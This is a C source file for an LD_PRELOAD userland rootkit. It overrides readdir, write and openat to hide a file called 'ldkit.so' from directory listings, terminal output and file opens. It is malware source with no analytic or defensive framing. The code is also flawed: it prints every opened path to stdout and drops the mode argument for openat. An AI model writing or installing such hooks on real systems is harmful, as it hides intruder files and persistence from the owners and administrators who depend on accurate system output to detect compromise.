#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <stdlib.h>

#define HIDDEN "ldkit.so"


struct dirent* readdir(DIR *dirp) {
    struct dirent* (*old_readdir)(DIR *);
    old_readdir = (struct dirent* (*)(DIR *dirp)) dlsym(RTLD_NEXT, "readdir");

    struct dirent *dir = old_readdir(dirp);

    while (dir != NULL && strcmp(dir->d_name, HIDDEN) == 0)
        dir = old_readdir(dirp);

    return dir;
}

// overwrite write function
ssize_t write(int fd, const void *buf, size_t count) {
    ssize_t (*old_write)(int fd, const void *buf, size_t count);
    old_write = (ssize_t (*)(int fd, const void *buf, size_t count)) dlsym(RTLD_NEXT, "write");

    if (fd == 1 || fd == 2) {
        char *new_buf = malloc(count + 1);
        memcpy(new_buf, buf, count);
        new_buf[count] = '\0';
        char *p = strstr(new_buf, "ldkit.so");
        if (p != NULL) {
            char *q = strstr(p, "\n");
            if (q != NULL) {
                memmove(p, q + 1, strlen(q + 1) + 1);
                count -= (q - p + 1);
            }
        }
        ssize_t ret = old_write(fd, new_buf, count);
        free(new_buf);
        return ret;
    }
    return old_write(fd, buf, count);
}

// overwrite openat function
int openat(int dirfd, const char *pathname, int flags, ...) {
    int (*old_openat)(int dirfd, const char *pathname, int flags, ...);
    old_openat = (int (*)(int dirfd, const char *pathname, int flags, ...)) dlsym(RTLD_NEXT, "openat");

    printf("openat: %s\n", pathname);

    if (strstr(pathname, HIDDEN) != NULL)
        return -1;

    return old_openat(dirfd, pathname, flags);
}